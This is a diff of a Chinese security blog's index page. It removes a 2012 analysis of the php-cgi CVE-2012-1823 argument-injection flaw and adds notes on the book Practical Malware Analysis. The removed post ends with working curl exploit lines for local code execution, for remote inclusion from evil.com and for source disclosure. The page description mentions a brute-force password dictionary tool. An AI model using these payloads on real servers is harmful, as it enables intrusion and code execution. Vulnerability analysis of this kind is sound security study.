@@ -9,10 +9,10 @@
   <meta name="author" content="ourren">
 
   
-  <meta name="description" content="首先说明只是自己的一些理解和看法，能力有限如有错误望请指正，谢谢。
-1、php三种模式
-php运行一般有三种运行模式:CGI模式、DLL模式、FastCGI模式。
-CGI模式：如果客户机请求一个php文件，Web服务器就调用php.exe(php5:php-cgi.exe)去解释这个文件， &hellip;">
+  <meta name="description" content="1、关于
+Sdgt(social dictionary generate tool)通过收集到的敏感信息，结合国人密码心理学，实现了一个简单的密码生成工具，可以在暴力破解方面使用。
+2、配置
+文件采用UTF8编码，template.txt中收集中csdn中top1000密码，可以把template &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -70,136 +70,6 @@ CGI模式：如果客户机请求一个php文件，Web服务器就调用php.exe(
     <div id="content">
       <div class="blog-index">
   
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/2012/05/04/cve-2012-1823-analyse/">CVE-2012-1823 漏洞原理分析</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2012-05-04T00:00:00-07:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>4</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
-        
-        
-            | <a href="/2012/05/04/cve-2012-1823-analyse/#comments">留言</a>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>首先说明只是自己的一些理解和看法，能力有限如有错误望请指正，谢谢。
-1、php三种模式
-php运行一般有三种运行模式:CGI模式、DLL模式、FastCGI模式。
-CGI模式：如果客户机请求一个php文件，Web服务器就调用php.exe(php5:php-cgi.exe)去解释这个文件，然后再把解释的结果以网页的形式返回给客户机,fork-and-execute 模式。
-DLL模式：Apache直接加载模块进行启动。
-FastCGI模式：FastCGI是cgi的升级版本，启动后一直运行，不需要每次都fork一次。</p>
-
-<p>2、整体流程
-在这个RCE中，触发的整体过程如下:
-用户提交的数据&mdash;>判定提交数据中是否有未编码的&#8217;=&lsquo;&ndash;(无)&ndash;>对该字符串进行解析&mdash;->转义元字符&mdash;->生成命令参数列表&mdash;->提交给CGI程序&mdash;->CGI进行处理。
-从CGI RFC的标准说起，原文：</p>
-
-<blockquote>4.4.  The Script Command Line
-
-Some systems support a method for supplying an array of strings to
-the CGI script.  This is only used in the case of an &#8216;indexed&#8217; HTTP
-query, which is identified by a &#8216;GET&#8217; or &#8216;HEAD&#8217; request with a URI
-query string that does not contain any unencoded &#8220;=&#8221; characters.  For
-such a request, the server SHOULD treat the query-string as a
-search-string and parse it into words, using the rules
-
-search-string = search-word *( &#8220;+&#8221; search-word )
-search-word   = 1*schar
-schar         = unreserved | escaped | xreserved
-xreserved     = &#8220;;&#8221; | &#8220;/&#8221; | &#8220;?&#8221; | &#8220;:&#8221; | &#8220;@&#8221; | &#8220;&&#8221; | &#8220;=&#8221; | &#8220;,&#8221; |
-&#8221;$&#8221;
-
-After parsing, each search-word is URL-decoded, optionally encoded in
-a system-defined manner and then added to the command line argument
-list.
-
-If the server cannot create any part of the argument list, then the
-server MUST NOT generate any command line information.  For example,
-the number of arguments may be greater than operating system or
-server limits, or one of the words may not be representable as an
-argument.
-
-The script SHOULD check to see if the QUERY_STRING value contains an
-unencoded &#8220;=&#8221; character, and SHOULD NOT use the command line
-arguments if it does.</blockquote>
-
-
-<p>理解：
-一些系统为了让CGI程序获取查询参数。处理如下,只允许有索引的查询（比如说GET,HEAD，同时提交参数中不能有未编码的&#8217;=&lsquo;），成功的话服务端程序就需要把这个查询字符当做搜索字符，并解析为不同字符，并按照规则进行处理，例如：
-[code lang=&ldquo;php&rdquo;]      search-string = search-word <em>( &ldquo;+&rdquo; search-word )  //查询字符
-      search-word   = 1</em>schar                            //提交的字符
-      schar         = unreserved | escaped | xreserved    //解析后的结果
-      xreserved     = &ldquo;;&rdquo; | &ldquo;/&rdquo; | &ldquo;?&rdquo; | &ldquo;:&rdquo; | &ldquo;@&rdquo; | &ldquo;&amp;&rdquo; | &ldquo;=&rdquo; | &ldquo;,&rdquo; | &ldquo;$&rdquo;    //需要转义的字符[/code]
-通过解析后，就把这些字符添加到参数列表中。如果服务器不能创建参数列表，那么就不需要生成任何命令信息。同时如果查询参数中包含有未编码的&rsquo;=&lsquo;，那么就不用解析参数。
-通过对Apache处理CGI RFC中发现，如果查询字符中未包含未编码的&rsquo;=&lsquo;，那么字符就会用&rsquo;+&lsquo;(编码的空格)符号进行分割，然后进行元字符转义，最后传递给CGI程序。
-但是不幸的是，PHP开发者忘记了RFC这部分内容，在2004年移除了这部分与其他地方冲突的代码，原文如下：</p>
-
-<blockquote>From: Rasmus Lerdorf <rasmus <at> lerdorf.com>
-Subject: [PHP-DEV] php-cgi command line switch memory check
-Newsgroups: gmane.comp.php.devel
-Date: 2004-02-04 23:26:41 GMT (7 years, 49 weeks, 3 days, 20 hours and 39 minutes ago)
-
-In our SAPI cgi we have a check along these lines:
-
-if (getenv(&#8220;SERVER_SOFTWARE&#8221;)
-|| getenv(&#8220;SERVER_NAME&#8221;)
-|| getenv(&#8220;GATEWAY_INTERFACE&#8221;)
-|| getenv(&#8220;REQUEST_METHOD&#8221;)) {
-cgi = 1;
-}
-//在这里进行判定，如果CGI程序运行在网络环境中，不对提交的参数进行解析，这样是没有漏洞的，但是由于某些原因进行了移除。
-
-if(!cgi) getopt(&#8230;)
-
-As in, we do not parse command line args for the cgi binary if we are
-running in a web context.  At the same time our regression testing system
-tries to use the cgi binary and it sets these variables in order to
-properly test GET/POST requests.  From the regression testing system we
-use -d extensively to override ini settings to make sure our test
-environment is sane.  Of course these two ideas conflict, so currently our
-regression testing is somewhat broken.  We haven&#8217;t noticed because we
-don&#8217;t have many tests that have GET/POST data and we rarely build the cgi
-binary.</blockquote>
-
-
-<p>3、利用
-查看php-cgi.exe的参数。
--s               Display colour syntax highlighted source.
--d foo[=bar]     Define INI entry foo with value &lsquo;bar&rsquo;
--n               No php.ini file will be used
-导致的漏洞可以源码泄漏，本地包含和远程包含，copy GaRY的利用代码。
-(1)本地包含直接执行代码:
-curl -H &ldquo;USER-AGENT: &lt;?system(&lsquo;id&rsquo;);die();?>&rdquo; <a href="http://target.com/test.php?-dauto_prepend_file%3d/proc/self/environ+-n">http://target.com/test.php?-dauto_prepend_file%3d/proc/self/environ+-n</a></p>
-
-<p>(2)远程包含执行代码:
-curl <a href="http://target.com/test.php?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt">http://target.com/test.php?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt</a></p>
-
-<p>(3)查看源码
-<a href="http://target.com/test.php?-s">http://target.com/test.php?-s</a>
-自己看了下php5中的php-cgi.exe貌似没有-r参数。</p>
-
-<p>4、参考：
-<a href="http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/">http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/</a>
-<a href="http://zone.wooyun.org/content/151">http://zone.wooyun.org/content/151</a></p>
-</div>
-  
-  
-
-
-    </article>
   
   
     <article>
@@ -517,6 +387,142 @@ F5 快速函数C语言格式化
 <p>chapter5整体知识点：</p>
 
 <p><a href="http://ourren.b0.upaiyun.com/chapter5.jpg"><img class="aligncenter" title="chapter5" src="http://ourren.b0.upaiyun.com/chapter5.jpg" alt="" width="556" height="321"></a></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2012/03/23/practical_malware_analysis_part1/">Practical Malware Analysis Part1总结</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-03-23T00:00:00-07:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2012/03/23/practical_malware_analysis_part1/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div>0x1 题外话</div>
+
+
+<div>        从去年看到这本书目录的时候就就期待这本书，前段时间一直比较忙没机会阅读这本书，现在可以每天抽点时间来阅读这本好书了，以此做下笔记监督自己，总结出一套适合自己的恶意代码分析方案。</div>
+
+
+<div>        总体来说，这本书从最基础的恶意代码分析开始到高难度的技巧分析，概括了恶意代码的各个方面。虽然原来自己也有一些分析恶意代码，但是看了这本书之后才发现作者思维的缜密和广度，不得不佩服。</div>
+
+
+<div>0x2 Part0 简介</div>
+
+
+<div>       本书第0部分主要针对恶意代码的目的、分析方法和恶意代码类型进行阐述，可以对这个技术进行一个整体的认识。</div>
+
+
+<div>       恶意代码的分析方法主要有：</div>
+
+
+<div>1)初级静态分析</div>
+
+
+<div>2)初级动态分析</div>
+
+
+<div>3)高级静态分析</div>
+
+
+<div>4)高级动态分析</div>
+
+
+<div>       恶意代码分析中需要注意的几个细节：</div>
+
+
+<div>1)不要过于纠结细节。</div>
+
+
+<div>2)不同的样本可能会需要不同的工具进行分析，灵活更换工具。</div>
+
+
+<div>3)试着从编写者角度考虑，分析过程本来就是一个猫捉老鼠的游戏。</div>
+
+
+<div>(接下来的章节就是从分析方法种类进行章节讲解。）</div>
+
+
+<div>0x3 Part1 初级分析</div>
+
+
+<div>    初级分析主要分为初级静态分析和初级动态分析。先总结下静态分析需要从哪些方面进行关注：杀毒软件查杀、文件MD5、编程语言、加壳与否、输入/出表关键函数、字符串、资源这些方面进行分析，一般步骤如下：</div>
+
+
+<div>1)可以上传到virustotal网站进行在线扫描，看是否是较老的样本了。</div>
+
+
+<div>2)查看文件MD5、hash值，谷歌看看。</div>
+
+
+<div>3)PEID查看文件是否编程语言、加壳与否、输入表和输出表关键函数（涉及到文件、注册表、网络等方面API函数）。</div>
+
+
+<div>4)用string.exe查看文件中的字符串。</div>
+
+
+<div>5)如果有资源文件，可以用Resource Hacker查看是否有额外的PE文件等。</div>
+
+
+<div><a href="http://ourren.b0.upaiyun.com/malwarechapter1.png"><img class="aligncenter" title="malware chapter1" src="http://ourren.b0.upaiyun.com/malwarechapter1.png" alt="" width="601" height="408"></a></div>
+
+
+<div>       通过以上的分析大概确定文件的大致功能，具体的操作需要结合动态分析了。下面讨论下初级动态分析的方法：</div>
+
+
+<div>       初级动态分析需要从文件操作、网络活动、注册表操作进行监控分析。可以采用sandbox进行分析，但是推荐采用虚拟机快照方式进行分析，主要工具如下：</div>
+
+
+<div>分析步骤：</div>
+
+
+<div><a href="blog.ourren.com/blog/malwaredynamicanalysis.png"><img class="aligncenter" title="malwaredynamicanalysis" src="http://blog.ourren.com/blog/malwaredynamicanalysis.png" alt="" width="654" height="304"></a></div>
+
+
+<div>1)运行Process Explorer、procmon、Wireshark程序。</div>
+
+
+<div>2)利用Regshot抓取第一次注册表快照，利用ApateDNS把所有域名链接全部转为本地，并用NC监听80和443端口。</div>
+
+
+<div>3)运行样本程序。</div>
+
+
+<div>4)通过ApateDNS查看网络情况、Regshot抓取第二次快照并对比分析。</div>
+
+
+<div>5)结合Process Explorer、procmon和静态分析结果进行详细分析。</div>
+
+
+<div>这个只是个大体过程，在实际分析中肯定还有一些其他的技巧，可以结合作者在每个part后面的lab进行练习。</div>
+
+
+<div id="__ss_12131085" style="width: 477px;">
+<strong style="display: block; margin: 12px 0 4px;"><a title="Practical malware analysis part1 总结" href="http://www.slideshare.net/opcodesec/practical-malware-analysis-part1" target="_blank">Practical malware analysis part1 总结</a></strong> <iframe src="http://www.slideshare.net/slideshow/embed_code/12131085" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" width="477" height="510"></iframe>
+<div style="padding: 5px 0 12px;">View more <a href="http://www.slideshare.net/" target="_blank">documents</a> from <a href="http://www.slideshare.net/opcodesec" target="_blank">opcodesec</a>
+</div>
+</div>
+
 </div>
   
   
